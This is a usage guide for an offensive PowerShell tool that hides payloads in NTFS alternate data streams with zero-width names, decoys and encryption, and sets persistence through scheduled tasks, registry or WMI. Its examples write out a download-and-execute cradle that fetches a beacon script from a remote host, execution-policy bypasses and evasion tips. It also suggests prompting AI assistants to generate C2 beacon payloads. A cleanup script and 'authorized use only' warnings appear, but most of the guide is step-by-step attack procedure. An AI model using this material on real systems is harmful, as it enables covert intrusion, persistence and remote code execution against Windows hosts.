# ADS Deployment Usage Guide (Consider either combining with other help file, or naming each file clearly for scope)

**Version:** 2.0.0 (Consolidated)  
**Workflow:** Linux Generator → Windows Target  
**Updated:** January 2026

---

## 🎯 Quick Start

### On Linux (Kali) - Generate Payload

```bash
# Install PowerShell Core if not already installed
# sudo apt install powershell

# Generate one-liner with payload baked in
pwsh ADS-OneLiner.ps1 \
  -Payload "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/beacon.ps1')" \
  -ZeroWidthMode single \
  -Persist task \
  -Encrypt

# Output saved to: ads-payload.txt
# Manifest saved to: ./manifests/manifest-TIMESTAMP.json
```

### On Windows Target - Deploy

```powershell
# Open PowerShell on target
# Copy-paste OPTION 1 from ads-payload.txt:

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <base64_string_here>

# Done! ADS created, persistence set, payload executed
```

---

## 📋 Complete Workflow Examples

### Example 1: Baked-In Payload (Recommended)

**Scenario:** You know the payload beforehand, want zero-width stealth with decoys

**On Linux:**
```bash
pwsh ADS-OneLiner.ps1 \
  -Payload 'Write-Host "Payload executed successfully"' \
  -ZeroWidthMode hybrid \
  -HybridPrefix "Zone.Identifier" \
  -CreateDecoys 3 \
  -Persist task \
  -Encrypt \
  -OutputFile "payload-dc01.txt"
```

**Output (payload-dc01.txt):**
```
═══════════════════════════════════════════════════════════════
 ADS Deployment Payload
 Generated: 2026-01-29 14:30:00
═══════════════════════════════════════════════════════════════

CONFIGURATION:
  Host File: C:\ProgramData\SystemCache.dat
  Zero-Width: hybrid (prefix: Zone.Identifier)
  Persistence: task
  Decoys: 3
  Encryption: True
  Payload Input: At Generation

MANIFEST (Linux-side):
  Stream Codepoints: U+005A U+006F U+006E U+0065 U+002E U+0049 U+0064 U+0065 U+006E U+0074 U+0069 U+0066 U+0069 U+0065 U+0072 U+200B
  Recovery Command: ConvertFrom-Codepoints -Codepoints 'U+005A U+006F...'

═══════════════════════════════════════════════════════════════
 OPTION 1: Base64 Encoded One-Liner (Recommended)
═══════════════════════════════════════════════════════════════

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAGMAcgBpAHAAdAA6AFoAVwBDAD0AQAAoADAAeA...

═══════════════════════════════════════════════════════════════
 OPTION 2: Readable Multi-Line Version (For Debugging)
═══════════════════════════════════════════════════════════════

[Full readable PowerShell code here]
```

**On Windows:**
- Copy OPTION 1
- Paste into PowerShell
- Press Enter

---

### Example 2: Runtime Payload Input

**Scenario:** Payload will be determined at deployment time

**On Linux:**
```bash
pwsh ADS-OneLiner.ps1 \
  -PayloadAtDeployment \
  -ZeroWidthMode single \
  -Persist task \
  -OutputFile "payload-runtime.txt"
```

**On Windows:**
```powershell
# Paste one-liner from payload-runtime.txt
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ...

# Script will prompt:
# Enter payload: _

# Type or paste your payload:
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/beacon.ps1')

# Press Enter twice to finish
```

**Note:** Runtime payload version cannot be fully base64-encoded (contains Read-Host prompt).

---

### Example 3: Multiple Targets

**Scenario:** Deploy to DC, Web Server, and App Server with different configs

**On Linux:**
```bash
# DC01 - Hybrid zero-width with heavy decoys
pwsh ADS-OneLiner.ps1 \
  -Payload $BEACON_PAYLOAD \
  -ZeroWidthMode hybrid \
  -CreateDecoys 5 \
  -Encrypt \
  -Persist task \
  -OutputFile "payload-dc01.txt"

# WEB01 - Single zero-width, minimal
pwsh ADS-OneLiner.ps1 \
  -Payload $BEACON_PAYLOAD \
  -ZeroWidthMode single \
  -Encrypt \
  -Persist task \
  -OutputFile "payload-web01.txt"

# APP01 - Multi zero-width, no decoys
pwsh ADS-OneLiner.ps1 \
  -Payload $BEACON_PAYLOAD \
  -ZeroWidthMode multi \
  -Encrypt \
  -Persist task \
  -OutputFile "payload-app01.txt"

# Manifests saved to ./manifests/ for each
ls manifests/
# manifest-20260129-143000.json  (DC01)
# manifest-20260129-143015.json  (WEB01)
# manifest-20260129-143030.json  (APP01)
```

**On Windows (each target):**
- DC01: Paste from payload-dc01.txt
- WEB01: Paste from payload-web01.txt
- APP01: Paste from payload-app01.txt

---

### Example 4: No Persistence (One-Time Execution)

**Scenario:** Just execute payload once without persistence

**On Linux:**
```bash
pwsh ADS-OneLiner.ps1 \
  -Payload 'whoami; ipconfig; net user' \
  -Persist none \
  -OutputFile "recon.txt"
```

**On Windows:**
```powershell
# Paste and run
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ...

# Output appears immediately
# No ADS created, no persistence set
```

---

## 🔧 Parameter Reference

### ADS-OneLiner.ps1 Parameters

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-Payload` | string | - | Payload content (required unless using -PayloadAtDeployment) |
| `-PayloadAtDeployment` | switch | false | Prompt for payload at Windows deployment time |
| `-ZeroWidthMode` | string | `single` | `single`, `multi`, or `hybrid` |
| `-HybridPrefix` | string | auto | Prefix for hybrid mode (e.g., `Zone.Identifier`) |
| `-Persist` | string | `task` | `task`, `registry`, `wmi`, or `none` |
| `-CreateDecoys` | int | 0 | Number of decoy streams (0-10) |
| `-Encrypt` | switch | false | Enable AES-256 encryption |
| `-Randomize` | switch | false | Randomize host file name |
| `-OutputFile` | string | `ads-payload.txt` | Where to save generated payload |
| `-ManifestDir` | string | `./manifests` | Directory for manifests (Linux) |

---

## 📂 File Structure

```
Linux Machine (Kali)
├── ADS-OneLiner.ps1        # Generator script
├── ADS-Dropper.ps1               # (Optional) standalone version
├── ads-payload.txt               # Generated output
└── manifests/                    # Manifest storage
    ├── manifest-20260129-143000.json
    ├── manifest-20260129-143015.json
    └── ...

Windows Target
└── [No files required - just paste and run]
```

---

## 🔍 Manifest File Structure

**Example:** `manifests/manifest-20260129-143000.json`

```json
{
  "Timestamp": "2026-01-29 14:30:00 UTC",
  "TargetHost": "UNKNOWN_WINDOWS_TARGET",
  "HostPath": "C:\\ProgramData\\SystemCache.dat",
  "StreamName": "Zone.Identifier\u200b",
  "Codepoints": "U+005A U+006F U+006E U+0065 U+002E U+0049 U+0064 U+0065 U+006E U+0074 U+0069 U+0066 U+0069 U+0065 U+0072 U+200B",
  "ByteSequence": "0x5A 0x00 0x6F 0x00 0x6E 0x00 0x65 0x00 ...",
  "ZeroWidthMode": "hybrid",
  "HybridPrefix": "Zone.Identifier",
  "Persistence": "task",
  "Encrypted": true,
  "DecoysCount": 3,
  "PayloadHash": "A3F5B2C1D4E6F7...",
  "Operator": "kali",
  "GeneratedOn": "attacker-machine",
  "GeneratedFrom": "/home/kali/ads/ADS-OneLiner.ps1",
  "OutputFile": "payload-dc01.txt"
}
```

---

## 🧹 Cleanup & Recovery

### Recovering Stream Names

**From Manifest (Linux):**
```bash
# View manifest
cat manifests/manifest-20260129-143000.json | jq '.Codepoints'
# Output: "U+005A U+006F U+006E U+0065..."

# Get codepoints for recovery command
CODEPOINTS=$(cat manifests/manifest-20260129-143000.json | jq -r '.Codepoints')
echo "ConvertFrom-Codepoints -Codepoints '$CODEPOINTS'"
```

**On Windows (Cleanup):**
```powershell
# Using codepoints from manifest
$sn = ConvertFrom-Codepoints -Codepoints 'U+005A U+006F U+006E ...'

# Verify stream exists
Get-Item 'C:\ProgramData\SystemCache.dat' -Stream *

# Remove stream
Remove-Item "C:\ProgramData\SystemCache.dat:$sn" -Force

# Remove task
Unregister-ScheduledTask -TaskName 'SystemOptimization' -Confirm:$false

# Remove host file
Remove-Item 'C:\ProgramData\SystemCache.dat' -Force
```

### Complete Cleanup Script

```powershell
# Get manifest codepoints (paste from Linux manifest)
$codepoints = 'U+005A U+006F U+006E U+0065 U+002E U+0049 U+0064 U+0065 U+006E U+0074 U+0069 U+0066 U+0069 U+0065 U+0072 U+200B'
$hostPath = 'C:\ProgramData\SystemCache.dat'

# Reconstruct stream name
function ConvertFrom-Codepoints {
    param([string]$Codepoints)
    $points = $Codepoints -split '\s+' | ForEach-Object {
        $cleaned = $_ -replace '^(U\+|0x)', ''
        [int]"0x$cleaned"
    }
    -join ($points | ForEach-Object { [char]$_ })
}

$streamName = ConvertFrom-Codepoints -Codepoints $codepoints

# Remove everything
Remove-Item "$hostPath`:$streamName" -Force -ErrorAction SilentlyContinue
Remove-Item $hostPath -Force -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName 'SystemOptimization' -Confirm:$false -ErrorAction SilentlyContinue

Write-Host "[+] Cleanup complete" -ForegroundColor Green
```

---

## 💡 Tips & Best Practices

### On Linux (Generation)

1. **Keep manifests safe** - They're your only recovery method for zero-width streams
2. **Name output files meaningfully** - `payload-dc01.txt`, not `output.txt`
3. **Version control manifests** - Git repo for manifest tracking
4. **Test locally first** - Generate, test on Windows VM before real deployment

### On Windows (Deployment)

1. **Check execution policy** - May need to bypass or set RemoteSigned
2. **Admin rights** - Some operations (task creation) need elevation
3. **Test with -NoExec first** - Use original ADS-Dropper.ps1 with -NoExec for testing
4. **Save one-liner locally** - Keep a copy in case you need to re-run

### General

1. **Encryption recommended** - Always use `-Encrypt` for sensitive payloads
2. **Decoys add noise** - Use 2-3 decoys minimum for better OPSEC
3. **Hybrid mode for legitimacy** - `Zone.Identifier` prefix looks normal
4. **Document deployments** - Track which manifest goes to which target

### LLM-Powered Generation

1. **Use Claude/ChatGPT for payload generation** - Ask AI to run ADS-OneLiner.ps1
2. **Iterate quickly** - Regenerate with different parameters in seconds
3. **Per-target customization** - Unique payloads for each target automatically
4. **Keep conversation context** - AI can reference previous manifests

**Example prompt:**
```
Generate an ADS payload with:
- C2 beacon to 10.0.0.50 every 60 seconds
- Full encryption and randomization
- 3 decoy streams
- Hybrid zero-width mode with Zone.Identifier prefix
```

---

## 🐛 Troubleshooting

### "Cannot be loaded because running scripts is disabled"

**Solution:**
```powershell
# On Windows target:
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "..."

# Or set policy temporarily:
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

### "Access denied" when creating task

**Solution:**
- Run PowerShell as Administrator
- Or use `-Persist none` for testing

### Manifest file not found

**Solution:**
```bash
# Check manifest directory
ls -la manifests/

# Create if missing
mkdir -p manifests
```

### Cannot recover zero-width stream

**Solution:**
- Check manifest file for codepoints
- Use `ConvertFrom-Codepoints` function
- If manifest lost, enumerate all streams byte-by-byte (see BLUE-TEAM-GUIDE.md)

---

## 📖 Additional Resources

- **BLUE-TEAM-GUIDE.md** - Detection and cleanup procedures
- **INTEGRATION-NOTES.md** - Technical implementation details
- **README.md** - Project overview and features

---

## ⚠️ Important Warnings

1. **Manifests are critical** - Without them, zero-width streams are nearly unrecoverable
2. **Always test in lab** - Do not deploy to production without testing
3. **Authorized use only** - This is for penetration testing with permission
4. **Keep Linux manifests secure** - They contain deployment details and codepoints
5. **One-liners are powerful** - Ensure you understand what you're executing

---

**Remember:** This tool is for authorized security testing only. Misuse is illegal and unethical.

© 2026 Qweary - Security Research With Purpose


